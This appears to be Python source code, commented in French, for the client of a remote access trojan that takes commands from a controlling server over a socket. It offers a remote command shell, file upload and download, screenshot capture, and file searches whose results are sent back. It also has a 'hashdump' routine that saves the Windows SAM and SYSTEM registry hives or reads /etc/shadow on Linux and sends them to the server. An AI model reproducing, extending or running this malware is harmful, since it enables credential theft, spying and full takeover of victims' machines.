import os
import subprocess
import io
import base64
import platform
import time
from PIL import ImageGrab

def execute_command(command):
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return base64.b64encode(output)
    except Exception as e:
        error_message = f"Command Error: {e}".encode('utf-8')
        return base64.b64encode(error_message)
    
def detect_os():
    return platform.system().lower()

def download_file_to_server(sock, file_path):
    try:
        with open(file_path, 'rb') as file:
            file_data = file.read()
            # Envoyer la taille du fichier
            sock.sendall(str(len(file_data)).encode() + b"\n")
            sock.sendall(file_data)
        print(f"Fichier {file_path} envoyé avec succès au serveur.")
    except FileNotFoundError:
        print(f"Fichier {file_path} non trouvé.")


def upload_file_from_server(sock, file_path):
    # D'abord, recevoir la taille du fichier
    file_size = int(sock.recv(1024).decode())
    with open(file_path, 'wb') as file:
        remaining = file_size
        while remaining > 0:
            data = sock.recv(1024)
            file.write(data)
            remaining -= len(data)
    print(f"Fichier {file_path} reçu avec succès du serveur.")



def open_shell(sock):
    while True:
        command = sock.recv(1024).decode()
        if command.lower() == "exit":
            break
        try:
            output = execute_command(command)
            sock.sendall(output)
        except Exception as e:
            sock.sendall(str(e).encode())

def get_ipconfig(sock):
    output = execute_command("ipconfig")
    sock.sendall(output)

def take_screenshot(sock):
    try:
        screenshot = ImageGrab.grab()
        with io.BytesIO() as bytes_io:
            screenshot.save(bytes_io, format="JPEG")
            bytes_io.seek(0)
            encoded_screenshot = base64.b64encode(bytes_io.read())
            sock.sendall(encoded_screenshot)
        sock.sendall(b"END_OF_SCREENSHOT")  # Signal de fin
        print("Capture d'écran envoyée avec succès.")
    except Exception as e:
        print(f"Erreur lors de la prise de capture d'écran: {e}")


def search_file(sock, search_query, start_path):
    found_files = []
    try:
        for root, dirs, files in os.walk(start_path):
            for file in files:
                if search_query.lower() in file.lower():
                    found_files.append(os.path.join(root, file))
                    if len(found_files) >= 10:  # Envoyer par lot de 10 résultats
                        response = '\n'.join(found_files).encode()
                        encoded_response = base64.b64encode(response)
                        sock.sendall(encoded_response)
                        found_files = []  # Réinitialiser la liste pour le prochain lot

        # Envoyer les résultats restants, s'il y en a
        if found_files:
            response = '\n'.join(found_files).encode()
            encoded_response = base64.b64encode(response)
            sock.sendall(encoded_response)

        # Envoyer un signal de fin de recherche
        sock.sendall(base64.b64encode(b"END_OF_SEARCH"))

    except Exception as e:
        error_message = f"Search Error: {e}".encode('utf-8')
        sock.sendall(base64.b64encode(error_message))


def hashdump(sock):
    os_type = detect_os()
    if os_type == 'windows':
        files = ["SAM", "SYSTEM"]
        # Envoyer le nombre de fichiers à transférer
        sock.sendall(str(len(files)).encode() + b'\n')
        for file in files:
            # Enregistrement du fichier dans le système
            execute_command(f"reg save HKLM\\{file} {file}")

            # Envoi du fichier
            with open(file, 'rb') as f:
                file_data = f.read()
                encoded_data = base64.b64encode(file_data)
                sock.sendall(f"{file},{len(encoded_data)}".encode() + b'\n')
                sock.sendall(encoded_data)
                sock.sendall(b"END_OF_FILE")  # Marqueur de fin pour ce fichier

            # Suppression du fichier après l'envoi
            os.remove(file)

    elif os_type == 'linux':
        file = "/etc/shadow"
        # Envoyer le nombre de fichiers à transférer
        sock.sendall(b"1\n")
        output = execute_command(f"cat {file}")
        sock.sendall(f"{os.path.basename(file)},{len(output)}".encode() + b'\n')
        sock.sendall(output)
        sock.sendall(b"END_OF_FILE")  # Marqueur de fin pour ce fichier

    # Envoyer le signal de fin après avoir traité tous les fichiers
    sock.sendall(b"END_OF_HASHDUMP")

















def handle_command(conn, cmd):
    if cmd.startswith("download"):
        file_path = cmd.split(" ", 1)[1]
        download_file_to_server(conn, file_path)
    elif cmd.startswith("upload"):
        file_path = cmd.split(" ", 1)[1]
        upload_file_from_server(conn, file_path)
    elif cmd.startswith("shell"):
        open_shell(conn)
    elif cmd.startswith("ipconfig"):
        get_ipconfig(conn)
    elif cmd.startswith("screenshot"):
        take_screenshot(conn)
    elif cmd.startswith("search"):
        parts = cmd.split(" ", 2)
        search_query = parts[1]
        start_path = parts[2] if len(parts) == 3 else "C:\\"
        search_file(conn, search_query, start_path)
    elif cmd.startswith("hashdump"):
        print("[DEBUG - Client] Exécution de la commande hashdump")  # Ajout pour le débogage
        hashdump(conn)